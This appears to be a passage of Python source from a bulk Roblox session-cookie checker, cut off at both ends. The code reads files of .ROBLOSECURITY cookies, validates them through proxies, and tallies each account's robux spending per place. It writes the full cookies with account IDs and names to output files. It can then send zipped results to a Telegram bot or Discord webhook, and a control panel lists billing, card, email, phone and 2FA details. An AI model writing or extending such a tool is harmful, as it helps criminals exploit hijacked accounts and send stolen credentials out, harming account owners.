                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][0]}\\{MT_Ignore_List}\\{ignoreItem[0]}{ANSI.CLEAR}\n\n')
                        while whileTrueStage7:
                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}I{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if ignoreItem[1] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Ignore}\n [{ANSI.FG.RED}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                            settingsTAIgnoreListIgnoreNameTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                            match settingsTAIgnoreListIgnoreNameTab.upper():
                                case 'I' | 'Ш':
                                    ignoreItem[1] ^= True
                                    await autoSaveConfig()
                                case 'D' | 'В':
                                    if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                                        whileTrueStage8 = True
                                        await removeLines(7)
                                        while whileTrueStage8:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][0]}\\{MT_Ignore_List}\\{ignoreItem[0]}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                                            confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match confirmTheAction.upper():
                                                case 'Y' | 'Н':
                                                    whileTrueStage7 = False
                                                    whileTrueStage8 = False

                                                    try: config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List'].remove(ignoreItem)
                                                    except Exception: pass
                                                case 'N' | 'Т':
                                                    whileTrueStage8 = False
                                    else:
                                        whileTrueStage7 = False
                                        await removeLines(7)

                                        try: config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List'].remove(ignoreItem)
                                        except Exception: pass

                                    await autoSaveConfig()
                                case '0':
                                    whileTrueStage7 = False
                                case 'F' | 'А':
                                    await cls()
                                    await lableASCII()

                            await autoSaveConfigAndRemoveLinesInSettings(settingsTAIgnoreListIgnoreNameTab.upper(), (), ('0', 'I', 'Ш'), 5)
                    elif settingsTAIgnoreListTab.upper() in ('A', 'Ф'):
                        await cls()
                        await lableASCII()
                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][0]}\\{MT_Ignore_List}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cancel}{ANSI.CLEAR}\n\n')
                        settingsTAPlaceIgnoreNameAdd = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_A_Transaction_Name}:{ANSI.CLEAR} ')

                        async def addIgnoreName():
                            if settingsTAPlaceIgnoreNameAdd == '0': return
                            if len(settingsTAPlaceIgnoreNameAdd) > 50:
                                return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_Name_50,               f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{listOfTAPlaces[placeIndex]}\\{MT_Ignore_List}')
                            if ([settingsTAPlaceIgnoreNameAdd, False] in config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List']) or ([settingsTAPlaceIgnoreNameAdd, True] in config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List']):
                                return await errorOrCorrectHandler(True, 5, MT_Transaction_With_This_Name_Already_Exists, f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{listOfTAPlaces[placeIndex]}\\{MT_Ignore_List}')

                            config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List'].append([settingsTAPlaceIgnoreNameAdd, False])
                            await autoSaveConfig()

                        await addIgnoreName()
                    elif settingsTAIgnoreListTab in ('+', '='):
                        for ignoreName in config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List']:
                            try: ignoreName[1] = True
                            except Exception: pass
                        await autoSaveConfig()
                    elif settingsTAIgnoreListTab in ('-', '_'):
                        for ignoreName in config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List']:
                            try: ignoreName[1] = False
                            except Exception: pass
                        await autoSaveConfig()
                    elif settingsTAIgnoreListTab.upper() in ('S', 'Ы'):
                        config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][3] ^= True
                        await autoSaveConfig()
                    elif settingsTAIgnoreListTab.upper() in ('C', 'С'):
                        config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][4] ^= True
                        await autoSaveConfig()

                    await cls()
                    await lableASCII()
            case 'C' | 'С':
                config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][2] ^= True
                await autoSaveConfig()
                await removeLines(9)
            case 'D' | 'В':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    whileTrueStage6 = True
                    await removeLines(9)
                    while whileTrueStage6:
                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][1][0] if config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][1][0] != f'Unknown_Normal_{listOfTAPlaces[placeIndex]}' else config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][1][1] if config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][1][1] != f'Unknown_Default_{listOfTAPlaces[placeIndex]}' else f'Unknown_{listOfTAPlaces[placeIndex]}'}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                        match confirmTheAction.upper():
                            case 'Y' | 'Н':
                                whileTrueStage5 = False
                                whileTrueStage6 = False

                                try: config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].remove(listOfTAPlaces[placeIndex])
                                except Exception: pass

                                try: config['Roblox']['TransactionAnalysis']['Places'].remove(f'{listOfTAPlaces[placeIndex]}_Ignore_List')
                                except Exception: pass

                                try: listOfTAPlaces.remove(listOfTAPlaces[placeIndex])
                                except Exception: pass
                            case 'N' | 'Т':
                                whileTrueStage6 = False

                        await removeLines(8)
                else:
                    whileTrueStage5 = False
                    await removeLines(9)

                    try: config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].remove(listOfTAPlaces[placeIndex])
                    except Exception: pass

                    try: config['Roblox']['TransactionAnalysis']['Places'].remove(f'{listOfTAPlaces[placeIndex]}_Ignore_List')
                    except Exception: pass

                    try: listOfTAPlaces.remove(listOfTAPlaces[placeIndex])
                    except Exception: pass

                await autoSaveConfig()
            case '0':
                whileTrueStage5 = False
                await removeLines(9)
            case 'F' | 'А':
                await cls()
                await lableASCII()
            case _:
                await removeLines(9)

async def isTransactionsFromCookieFunc(checkListPlaces: set, cookieRoblox: dict | None, headersRoblox: dict | None, proxies: list, ssl=False) -> dict:
    if not config['Roblox']['TransactionAnalysis']['General']['First_Check_All_Cookies_For_Valid']:
        responseStatus = await isResponseStatusFromCookie(cookieRoblox, headersRoblox, proxies, ssl)
        if responseStatus != 200:
            return responseStatus, None, None, None

    while True:
        try:
            session = ClientSession(connector=await robloxGetConnector('TransactionAnalysis', proxies), cookies=cookieRoblox, headers=headersRoblox)
            responseAccountInformation = await session.get(f'https://www.roblox.com/my/settings/json', timeout=3, ssl=ssl)
            isAccountInformation = await responseAccountInformation.json()
            isID   = isAccountInformation['UserId']
            isName = isAccountInformation['Name']
            break
        except KeyError:
            if responseAccountInformation.status == 302:
                await session.close()
                return 302, None, None, None
            await asyncio.sleep(5)
        except ContentTypeError:
            await asyncio.sleep(1)
        except (ClientOSError, ConnectionTimeoutError, ClientConnectorError, ServerDisconnectedError, ProxyConnectionError, ProxyTimeoutError, TimeoutError):
            await session.close()

    nextPageCursorTransactions = ''
    while nextPageCursorTransactions != None:
        try:
            async with session.get(f'https://economy.roblox.com/v2/users/{isID}/transactions?transactionType=2&limit=100&cursor={nextPageCursorTransactions}', timeout=3, ssl=ssl) as response:
                transactions = await response.json()
                for transaction in transactions['data']:
                    placeID = str(transaction['details']['place']['placeId']) if 'place' in transaction['details'] else str(transaction['details']['id'])
                    if placeID in checkListPlaces:
                        transactionName = transaction['details']['name']
                        ignoreList = config['Roblox']['TransactionAnalysis']['Places'][f'{placeID}_Ignore_List']
                        if [transactionName, True] not in ignoreList or config['Roblox']['TransactionAnalysis']['Places'][placeID][4]:
                            price = abs(transaction['currency']['amount'])
                            checkListPlaces[placeID][1] += price
                        if [transactionName, True] not in ignoreList:
                            checkListPlaces[placeID][3].append([transactionName, price, datetime.strptime(transaction['created'], '%Y-%m-%dT%H:%M:%S.%fZ').strftime('%d.%m.%Y - %H:%M:%S')])
                        if ([transactionName, True] not in ignoreList and [transactionName, False] not in ignoreList) and config['Roblox']['TransactionAnalysis']['Places'][placeID][3]:
                            ignoreList.append([transactionName, False])
                        checkListPlaces[placeID][2] += 1
                nextPageCursorTransactions = transactions['nextPageCursor']
            await session.close()
        except (KeyError, ContentTypeError):
            if response.status == 401:
                await session.close()
                return 401, None, None, None
            await asyncio.sleep(5)
        except (ClientOSError, ConnectionTimeoutError, ClientConnectorError, ServerDisconnectedError, ProxyConnectionError, ProxyTimeoutError, TimeoutError):
            await session.close()
            session = ClientSession(connector=await robloxGetConnector('TransactionAnalysis', proxies), cookies=cookieRoblox, headers=headersRoblox)

    return 200, isID, isName, checkListPlaces

async def robloxTransactionAnalysis(file: str):
    checkListPlaces = {str(place): [config['Roblox']['TransactionAnalysis']['Places'][str(place)][1][0], 0, 0, []] for place in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']
                       if str(place).isdigit() and config['Roblox']['TransactionAnalysis']['Places'][str(place)][2]}
    await cls()
    await lableASCII()
    if not checkListPlaces:
        return await errorOrCorrectHandler(True, 0, MT_Enable_At_Least_One_Place_To_Start_Analysis, f'{MT_Roblox}\\{MT_Transaction_Analysis}')

    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Transaction_Analysis}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Wait[0]}...')

    proxiesFromFile = await getProxiesFromFile(config['Roblox']['TransactionAnalysis']['Proxy']['Use_Proxy'], 'Roblox\\Transaction Analysis\\proxies.txt', f'{MT_Roblox}\\{MT_Transaction_Analysis}', 2)
    if config['Roblox']['TransactionAnalysis']['Proxy']['Use_Proxy'] and not proxiesFromFile:
        return

    cookiesFromFile = await getCookiesFromFile(f'Roblox\\Transaction Analysis\\{file}.txt', f'{MT_Roblox}\\{MT_Transaction_Analysis}', 2)
    if not cookiesFromFile:
        return

    useSSL = True if config['Roblox']['TransactionAnalysis']['General']['Use_SSL'] else False

    sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINE1}{file}.txt{ANSI.CLEAR + ANSI.DECOR.BOLD}\':\n')

    checkReadyRobloxCookies = await robloxCookieValidChecker('TransactionAnalysis', cookiesFromFile, proxiesFromFile, useSSL)
    if not checkReadyRobloxCookies:
        return

    cookieCount = 0
    validCount = 0
    allTotalRobux = 0
    allTransactionsCount = 0
    dateOfCheck = datetime.now().strftime('%d.%m.%Y - %H.%M.%S')
    semaphore = asyncio.Semaphore(int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']) if str(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']).isdigit() and (0 < int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']) <= 500) else 10)
    locker = asyncio.Lock()

    async def threadingTransactionAnalysis(cookie: str, proxies: list | None = None):
        nonlocal cookieCount, validCount, allTotalRobux, allTransactionsCount
        async with semaphore:
            cookieRoblox = {'.ROBLOSECURITY': cookie}
            headersRoblox = None # {'User-Agent': ua.random}

            responseStatus, isID, isName, checkListPlaces_ = await isTransactionsFromCookieFunc(deepcopy(checkListPlaces), cookieRoblox, headersRoblox, proxies, useSSL)
            if responseStatus == 200:
                totalWord = ''.join(MT_Total).lower().capitalize()
                partOfCookie = f'{cookie[115:130]}...{cookie[-15:-1]}'

                for _, place in checkListPlaces_.items():
                    if not place[1]: continue

                    allTotalRobux += place[1]
                    os.makedirs(f'Roblox\\Transaction Analysis\\outputs\\{dateOfCheck}\\{partOfCookie}{f' ({isName})' if config['Roblox']['TransactionAnalysis']['General']['Add_Nick_After_Cookie_In_Folder_Names'] else ''}', exist_ok=True)
                    if config['Roblox']['TransactionAnalysis']['General']['Save_Places_To_Different_Files']:
                        async with aiofiles.open(f'Roblox\\Transaction Analysis\\outputs\\{dateOfCheck}\\{partOfCookie}{f' ({isName})' if config['Roblox']['TransactionAnalysis']['General']['Add_Nick_After_Cookie_In_Folder_Names'] else ''}\\{place[0]}{f' ({place[1]} R$)' if config['Roblox']['TransactionAnalysis']['General']['Add_Robux_After_Place_In_File_Names'] else ''}.txt', 'a', encoding='UTF-8', errors='ignore') as f:
                            await f.write(f'\n Meow :3\n\n {MT_Id}: {isID}\n {MT_Nickname}: {isName}\n {MT_Link}: https://www.roblox.com/users/{isID}\n {MT_Cookie}: {cookie}\n{'-'*52}\n > {totalWord}: {place[1]} R$\n{'-'*52}\n')
                            for item in place[3]:
                                await f.write(f' > {MT_Name}: {item[0]}\n > {MT_Price}: {item[1]} R$\n > {MT_Date}: {item[2]}\n{'-'*52}\n')
                                allTransactionsCount += 1

                placeTotalRobux        = sum(place[1] for _, place in checkListPlaces_.items())
                placeTransactionsCount = sum(place[2] for _, place in checkListPlaces_.items())
                if config['Roblox']['TransactionAnalysis']['General']['Save_All_Places_In_One_File'] and allTotalRobux:
                    indentationLength = max(len(place[0]) for _, place in checkListPlaces_.items()) + 1 if config['Roblox']['TransactionAnalysis']['General']['Indentation_Options'] == 'MaxIndent' else 0
                    async with aiofiles.open(f'Roblox\\Transaction Analysis\\outputs\\{dateOfCheck}\\{partOfCookie}{f' ({isName})' if config['Roblox']['TransactionAnalysis']['General']['Add_Nick_After_Cookie_In_Folder_Names'] else ''}\\.All{f' ({placeTotalRobux} R$)' if config['Roblox']['TransactionAnalysis']['General']['Add_Robux_After_Place_In_File_Names'] else ''}.txt', 'a', encoding='UTF-8', errors='ignore') as f:
                        await f.write(f'\n Meow :3\n\n {MT_Id}: {isID}\n {MT_Nickname}: {isName}\n {MT_Link}: https://www.roblox.com/users/{isID}\n {MT_Cookie}: {cookie}\n{'-'*52}\n > {totalWord}: {placeTotalRobux} R$\n{'-'*52}\n')
                        for _, place in checkListPlaces_.items():
                            if place[1]:
                                await f.write(f' > {place[0]:<{indentationLength}}: {place[1]} R$\n')                        
                        await f.write(f'{'-'*52}\n')

                sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}{MT_Nickname}:{ANSI.CLEAR + ANSI.DECOR.BOLD} {isName} | {ANSI.FG.CYAN}{MT_Transactions}: {ANSI.FG.GREEN if placeTransactionsCount else ANSI.FG.RED}{placeTransactionsCount}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {ANSI.FG.CYAN}{MT_Spent}: {ANSI.FG.GREEN if placeTotalRobux else ANSI.FG.RED}{placeTotalRobux} R${ANSI.CLEAR + ANSI.DECOR.BOLD} | {ANSI.FG.GRAY}{partOfCookie}{ANSI.CLEAR}\n')
            else:
                sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.RED}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Invalid_Cookie}{ANSI.CLEAR}\n')

    transactionsCheckTasks = [threadingTransactionAnalysis(cookie, proxiesFromFile if config['Roblox']['TransactionAnalysis']['Proxy']['Use_Proxy'] else None) for cookie in checkReadyRobloxCookies]
    await asyncio.gather(*transactionsCheckTasks)

    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Checking_Complete}\n\n')
    if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()

    if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] or config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
        await makeArchive(f'Roblox\\Transaction Analysis\\outputs\\{dateOfCheck}')

        messageText = f'*💜 {MT_Roblox} {MT_Transaction_Analysis.lower()}\n\n🛒 {MT_Transactions}: {allTransactionsCount}\n💎 {MT_Spent}: {allTotalRobux} R$*'

        if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot']:
            await sendMessageTelegramBot(str(config['Roblox']['General']['Outputs']['Telegram_Bot_Token']), str(config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']), messageText, f'Roblox\\Transaction Analysis\\outputs\\{dateOfCheck}.zip')

        if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
            await sendMessageDiscordWebhook(str(config['Roblox']['General']['Outputs']['Discord_Webhook_URL']), messageText.replace('*', '**'), 'Roblox\\Transaction Analysis\\outputs', f'{dateOfCheck}.zip')
        sys.stdout.write('\n')

    await waitingInput()

### Cookie Control Panel

async def printCCPCookiesInHistory(category):
    for index, cookie in enumerate(config['Roblox']['CookieControlPanel'][category]):
        sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(config['Roblox']['CookieControlPanel'][category]))) + 15)} ┃ {cookie} ({config['Roblox']['CookieControlPanel'][category][cookie][2]})\n')

async def cookieControlPanel(category: str, key: str, path: str):
    whileTrueStageCCP1 = True
    await cls()
    await lableASCII()
    while whileTrueStageCCP1:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{path}\\{key}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Data}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Show_Cookie}\n  ┃\n [{ANSI.FG.RED}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
        cookieControlPanelCookieCurrentCookieMainTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
        match cookieControlPanelCookieCurrentCookieMainTab.upper():
            case '1':
                whileTrueStageCCP2 = True
                await cls()
                await lableASCII()
                while whileTrueStageCCP2:
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{path}\\{key}\\{MT_Data}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD} [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Country Reg.' if config['Roblox']['CookieControlPanel'][category][key][0] == '?' else f'Country Reg.: {config['Roblox']['CookieControlPanel'][category][key][0]}'}\n  [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} ID' if config['Roblox']['CookieControlPanel'][category][key][1] == '?' else f'ID: {config['Roblox']['CookieControlPanel'][category][key][1]}'}\n  [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Name' if config['Roblox']['CookieControlPanel'][category][key][2] == '?' else f'Name: {config['Roblox']['CookieControlPanel'][category][key][2]}'}\n  [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Display Name' if config['Roblox']['CookieControlPanel'][category][key][3] == '?' else f'Display Name: {config['Roblox']['CookieControlPanel'][category][key][3]}'}\n  [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Reg. Date' if config['Roblox']['CookieControlPanel'][category][key][4] == '?' else f'Reg. Date: {config['Roblox']['CookieControlPanel'][category][key][4]}'} {f'({config['Roblox']['CookieControlPanel'][category][key][5]})' if config['Roblox']['CookieControlPanel'][category][key][5] != None else ''}\n  [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Robux' if config['Roblox']['CookieControlPanel'][category][key][6] == '?' else f'Robux: {config['Roblox']['CookieControlPanel'][category][key][6]}'}\n  [{ANSI.FG.PINK}7{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Billing' if config['Roblox']['CookieControlPanel'][category][key][7] == '?' else f'Billing: {config['Roblox']['CookieControlPanel'][category][key][7]}'}\n  [{ANSI.FG.PINK}8{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Pending' if config['Roblox']['CookieControlPanel'][category][key][8] == '?' else f'Pending: {config['Roblox']['CookieControlPanel'][category][key][8]}'}\n  [{ANSI.FG.PINK}9{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Donate' if config['Roblox']['CookieControlPanel'][category][key][9] == '?' else f'Donate: {config['Roblox']['CookieControlPanel'][category][key][9]}'}\n [{ANSI.FG.PINK}10{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Donate (All Time)' if config['Roblox']['CookieControlPanel'][category][key][10] == '?' else f'Donate (All Time): {config['Roblox']['CookieControlPanel'][category][key][10]}'}\n [{ANSI.FG.PINK}11{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Custom Gamepasses' if config['Roblox']['CookieControlPanel'][category][key][11] == '?' else f'Custom Gamepasses: {config['Roblox']['CookieControlPanel'][category][key][11]}'}\n [{ANSI.FG.PINK}12{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Rap' if config['Roblox']['CookieControlPanel'][category][key][12] == '?' else f'Rap: {config['Roblox']['CookieControlPanel'][category][key][12]}'}\n [{ANSI.FG.PINK}13{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Card' if config['Roblox']['CookieControlPanel'][category][key][13] == '?' else f'Card: {config['Roblox']['CookieControlPanel'][category][key][13]}'}\n [{ANSI.FG.PINK}14{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Premium' if config['Roblox']['CookieControlPanel'][category][key][14] == '?' else f'Premium: {config['Roblox']['CookieControlPanel'][category][key][14]}'}\n [{ANSI.FG.PINK}15{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Gamepasses' if config['Roblox']['CookieControlPanel'][category][key][15] == '?' else f'Gamepasses: {config['Roblox']['CookieControlPanel'][category][key][15]}'}\n [{ANSI.FG.PINK}16{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Badges' if config['Roblox']['CookieControlPanel'][category][key][16] == '?' else f'Badges: {config['Roblox']['CookieControlPanel'][category][key][16]}'}\n [{ANSI.FG.PINK}17{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Fav. Places' if config['Roblox']['CookieControlPanel'][category][key][16] == '?' else f'Fav. Places: {config['Roblox']['CookieControlPanel'][category][key][16]}'}\n [{ANSI.FG.PINK}18{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Bundles' if config['Roblox']['CookieControlPanel'][category][key][18] == '?' else f'Bundles: {config['Roblox']['CookieControlPanel'][category][key][18]}'}\n [{ANSI.FG.PINK}19{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Inv. Privacy' if config['Roblox']['CookieControlPanel'][category][key][19] == '?' else f'Inv. Privacy: {config['Roblox']['CookieControlPanel'][category][key][19]}'}\n [{ANSI.FG.PINK}20{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Trade Privacy' if config['Roblox']['CookieControlPanel'][category][key][20] == '?' else f'Trade Privacy: {config['Roblox']['CookieControlPanel'][category][key][20]}'}\n [{ANSI.FG.PINK}21{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Can Trade' if config['Roblox']['CookieControlPanel'][category][key][21] == '?' else f'Can Trade: {config['Roblox']['CookieControlPanel'][category][key][21]}'}\n [{ANSI.FG.PINK}22{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Sessions' if config['Roblox']['CookieControlPanel'][category][key][22] == '?' else f'Sessions: {config['Roblox']['CookieControlPanel'][category][key][22]}'}\n [{ANSI.FG.PINK}23{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Email' if config['Roblox']['CookieControlPanel'][category][key][23] == '?' else f'Email: {config['Roblox']['CookieControlPanel'][category][key][23]}'}\n [{ANSI.FG.PINK}24{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Phone' if config['Roblox']['CookieControlPanel'][category][key][24] == '?' else f'Phone: {config['Roblox']['CookieControlPanel'][category][key][24]}'}\n [{ANSI.FG.PINK}25{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} 2FA' if config['Roblox']['CookieControlPanel'][category][key][25] == '?' else f'2FA: {config['Roblox']['CookieControlPanel'][category][key][25]}'}\n [{ANSI.FG.PINK}26{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Pin' if config['Roblox']['CookieControlPanel'][category][key][26] == '?' else f'Pin: {config['Roblox']['CookieControlPanel'][category][key][26]}'}\n [{ANSI.FG.PINK}27{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} >13' if config['Roblox']['CookieControlPanel'][category][key][27] == '?' else f'>13: {config['Roblox']['CookieControlPanel'][category][key][27]}'}\n [{ANSI.FG.PINK}28{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} 